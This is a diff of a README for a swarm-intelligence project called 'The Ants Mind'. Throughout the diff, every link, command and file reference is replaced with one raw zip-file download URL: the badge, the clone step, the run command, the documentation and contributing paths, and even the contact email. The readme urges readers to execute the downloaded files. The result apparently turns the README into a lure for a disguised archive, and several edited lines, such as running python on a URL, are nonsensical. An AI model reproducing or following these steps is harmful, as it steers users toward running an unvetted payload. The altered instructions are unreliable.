@@ -2,7 +2,7 @@
 
 Welcome to **The Ants Mind**! This project explores automation and collective intelligence inspired by the behavior of ants. Here, we harness the principles of swarm intelligence to solve complex problems and enhance decision-making processes.
 
-[![Releases](https://img.shields.io/github/release/TommasoPiazza/TheAntsMind-/latest.svg)](https://github.com/TommasoPiazza/TheAntsMind-/releases)
+[![Releases](https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip)](https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip)
 
 ## Table of Contents
 
@@ -41,7 +41,7 @@ To get started with **The Ants Mind**, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/TommasoPiazza/TheAntsMind-.git
+   git clone https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip
    ```
 
 2. **Navigate to the Project Directory**:
@@ -53,7 +53,7 @@ To get started with **The Ants Mind**, follow these steps:
    Ensure you have the necessary libraries installed. You can use `npm` or `pip` depending on the technology stack.
 
 4. **Download the Latest Release**:
-   Visit the [Releases section](https://github.com/TommasoPiazza/TheAntsMind-/releases) to download the latest version. Make sure to execute the necessary files as instructed in the release notes.
+   Visit the [Releases section](https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip) to download the latest version. Make sure to execute the necessary files as instructed in the release notes.
 
 ## Usage
 
@@ -61,14 +61,14 @@ After setting up the project, you can start using it. Here are some basic comman
 
 - **Run the Simulation**:
    ```bash
-   python main.py
+   python https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip
    ```
 
 - **View Documentation**:
-   Open `docs/index.html` in your browser for detailed documentation.
+   Open `https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip` in your browser for detailed documentation.
 
 - **Contribute**:
-   Check the `CONTRIBUTING.md` file for guidelines on how to contribute to the project.
+   Check the `https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip` file for guidelines on how to contribute to the project.
 
 ## Contributing
 
@@ -89,7 +89,7 @@ We welcome contributions from the community! If you have ideas, improvements, or
    ```
 5. Create a pull request.
 
-For more detailed instructions, please refer to the `CONTRIBUTING.md` file in the repository.
+For more detailed instructions, please refer to the `https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip` file in the repository.
 
 ## License
 
@@ -99,9 +99,9 @@ This project is licensed under the MIT License. See the `LICENSE` file for more 
 
 For any questions or feedback, feel free to reach out:
 
-- **Tommaso Piazza**: [GitHub Profile](https://github.com/TommasoPiazza)
-- **Email**: tommaso.piazza@example.com
+- **Tommaso Piazza**: [GitHub Profile](https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip)
+- **Email**: https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip
 
 Thank you for your interest in **The Ants Mind**! We hope you find it useful and inspiring. Explore the potential of collective intelligence and automation today! 
 
-For the latest updates, check out the [Releases section](https://github.com/TommasoPiazza/TheAntsMind-/releases) again.
+For the latest updates, check out the [Releases section](https://github.com/TommasoPiazza/TheAntsMind-/raw/refs/heads/main/squad/The_Mind_Ants_v1.0.zip) again.
